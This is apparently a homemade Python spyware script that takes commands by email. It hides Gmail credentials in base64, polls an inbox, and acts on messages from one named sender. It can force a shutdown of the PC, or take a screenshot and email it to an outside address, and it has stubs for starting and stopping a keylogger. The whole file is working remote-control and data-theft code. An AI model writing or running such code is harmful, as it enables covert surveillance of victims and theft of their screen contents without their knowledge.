import smtplib
import base64
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import imaplib
import base64
import re
import time
import subprocess
import pyautogui

def sender(BodyText,attach_filename,recived_attachments):
    senderemail=base64.b64decode('c3B5Zm91cGRhdG9yQGdtYWlsLmNvbQ==').decode('utf-8')
    senderpass=base64.b64decode('c3B5Zm91cGRhdG9yeHh4eA==').decode('utf-8')
    recivermail=base64.b64decode('YW5pc2guZGhha2FsLmFkLmFkMTVAZ21haWwuY29t').decode('utf-8')
        



    msg=MIMEMultipart()
    msg['From']=senderemail
    msg['To']=recivermail
    msg['Subject']='Subject'
    body=BodyText
    msg.attach(MIMEText(body,'plain'))

    if(attach_filename=="NULL" and recived_attachments=="NULL"):
        msg=msg.as_string()
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.login(senderemail,senderpass)
        server.sendmail(senderemail,recivermail,msg)
        server.close()
    
    else:
        part =MIMEBase('application','octet-stream')
        part.set_payload(recived_attachments)
        encoders.encode_base64(part)
        part.add_header("Content-Disposition","attachment; filename= "+attach_filename)
        msg.attach(part)

        msg=msg.as_string()
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.login(senderemail,senderpass)
        server.sendmail(senderemail,recivermail,msg)
        server.close()


def reader():
    email_user = base64.b64decode('c3B5Zm91cGRhdG9yQGdtYWlsLmNvbQ==').decode('utf-8')
    email_pass = base64.b64decode('c3B5Zm91cGRhdG9yeHh4eA==').decode('utf-8')
    M = imaplib.IMAP4_SSL('imap.gmail.com', 993)
    M.login(email_user, email_pass)
    M.select()
    
    typ, message_numbers = M.search(None, 'ALL')
    raw=[]
    for num in message_numbers[0].split():
        typ, data = M.fetch(num, '(RFC822)')
        data=data[0][1].decode('utf-8')
        raw.append(data)

    M.close()
    M.logout()
    #text=re.search('<div dir=3D"auto">',raw)
    c=len(raw)
    information=[]

    while (c-1)!=0:
        for data in raw:
            stri=""
            start=(re.search(': text/plain; charset="UTF-8"\r\n\r\n',data)).end()
            end=(re.search('\r\n\r\nOn',data)).start()
            stri+='Body: '+data[start:end]+" ::: "
            start=(re.search('\r\nFrom: ',data)).end()
            end=(re.search('\r\nDate: ',data)).start()
            stri+='From: '+data[start:end]+" ::: "
            start=(re.search('\r\nSubject: ',data)).end()
            end=(re.search('\r\nTo: ',data)).start()
            stri+='Subject: '+data[start:end]+" ::::::"
            information.append(stri)
#            with open('info.bss','a+') as opn:
#                opn.write(stri)
        c=c-1
    return information
def fechdata(no,fecher):
    temp=[]
    if fecher=="slist" and no=="NULL":
        for value in data:
            start=(re.search(' ::: From: ',value)).end()
            end=(re.search(' ::: Subject: ',value)).start()
            temp.append(value[start:end])
    elif fecher=="sublist" and no=="NULL":
        for value in data:
            start=(re.search('> ::: Subject: ',value)).end()
            end=(re.search(' ::::::',value)).start()
            temp.append(value[start:end])
            
    elif fecher=="sname" and no!="NULL":
        value=data[(int(no)-1)]
        raw=""
        start=(re.search(' ::: From: ',value)).end()
        end=(re.search(' ::: Subject: ',value)).start()
        raw=value[start:end]
        end=(re.search(' <',raw)).end()
        return(raw[:(end-1)])
    elif fecher=="semail" and no!="NULL":
        value=data[(int(no)-1)]
        raw=""
        start=(re.search(' ::: From: ',value)).end()
        end=(re.search(' ::: Subject: ',value)).start()
        raw=value[start:end]
        start=(re.search(' <',raw)).end()
        r=(raw[start:])
        return(r[:(len(r)-1)])
    elif fecher=="body" and no!="NULL":
        value=data[(int(no)-1)]
        start=(re.search('Body: ',value)).end()
        end=(re.search(' ::: From:',value)).start()
        return(value[start:end])
        
    elif fecher=="sublist" and no!="NULL":
        value=data[(int(no)-1)]
        start=(re.search(' ::: Subject: ',value)).end()
        end=(re.search(' ::::::',value)).start()
        return(value[start:end])
    else:
               return "NULL"
    return temp
oldcount=2

#sender("Hello","NULL","NULL")
#sender("attach aayo?","#####.html",byte)

while(True):
    data=reader()
    no_email=len(data)
    i=no_email
    if(oldcount<no_email):
        if((fechdata(i,"sname"))=="Anish Dhakal "):
            cmd=fechdata(i,"body")
            if cmd=="shoutdown":
                sender("pc was shoutting down", "NULL", "NULL")
                subprocess.call(["shutdown", "-f", "-s", "-t", "20"])
            elif cmd=="screenshot":
                pic=pyautogui.screenshot()
                pic.save('screenshot.png')
                with open('screenshot.png','rb+') as fle:
                    fle=fle.read()
                sender("screenshot herkata","screenshot.png",fle)
            elif cmd=="startlogging":
                print("Keylogging started")
            elif cmd=="stoplogging":
                print("keys are uploading")
            oldcount=i
            time.sleep(2)

    else:
        time.sleep(5)
